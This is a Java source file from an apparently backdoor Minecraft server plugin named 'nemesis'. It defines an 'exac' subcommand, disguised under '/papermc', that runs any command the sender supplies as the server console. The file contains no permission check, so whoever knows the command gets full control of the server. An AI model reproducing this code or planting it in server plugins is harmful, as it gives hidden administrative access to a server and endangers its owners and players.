package nemesis.commands.subcommands;

import nemesis.Utils;
import nemesis.commands.SubCommand;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;

public class Exac implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length > 1) {
            if (args[1] == null) {
                sender.sendMessage(Utils.colorize("&cPlease specify a command!"));
                return;
            }

            StringBuilder cmdargs = new StringBuilder();
            for (int i = 2; i < args.length; i++) {
                cmdargs.append(args[i]).append(" ");
            }

            if (cmdargs.length() > 0) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1] + " " + cmdargs);
                return;
            }

            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1]);
            sender.sendMessage(Utils.colorize("&aYou have successfully executed the command " + args[1]));
        } else {
            sender.sendMessage(Utils.colorize("&cUsage: /papermc exac <command>"));
        }
    }

    @Override
    public String getName() {
        return "exac";
    }
}